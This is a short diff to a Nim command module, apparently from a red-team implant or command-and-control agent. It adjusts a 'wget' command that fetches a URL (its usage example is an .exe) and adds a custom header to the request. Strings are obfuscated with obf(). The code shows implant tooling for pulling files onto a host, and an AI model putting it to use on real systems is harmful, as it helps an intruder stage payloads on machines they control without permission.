@@ -5,7 +5,7 @@ from ../util/webClient import Listener
 
 # Curl an HTTP webpage to stdout
 proc wget*(li : Listener, args : varargs[string]) : string =
-    var 
+    var
         url : string
         filename : string
         res : string
@@ -19,12 +19,15 @@ proc wget*(li : Listener, args : varargs[string]) : string =
     else:
         result = obf("Invalid number of arguments received. Usage: 'wget [URL] <optional: path>'.")
         return
-    
+
     res = fetch(
             url,
-            headers = @[Header(key: obf("User-Agent"), value: li.userAgent)]
+            headers = @[
+                Header(key: obf("User-Agent"), value: li.userAgent),
+                Header(key: obf("X-Header"), value: li.customHeaderOne)
+              ]
             )
-    
+
     if res == "":
         result = obf("No response received. Ensure you format the url correctly and that the target server exists. Example: 'wget https://yourhost.com/file.exe'.")
     else:
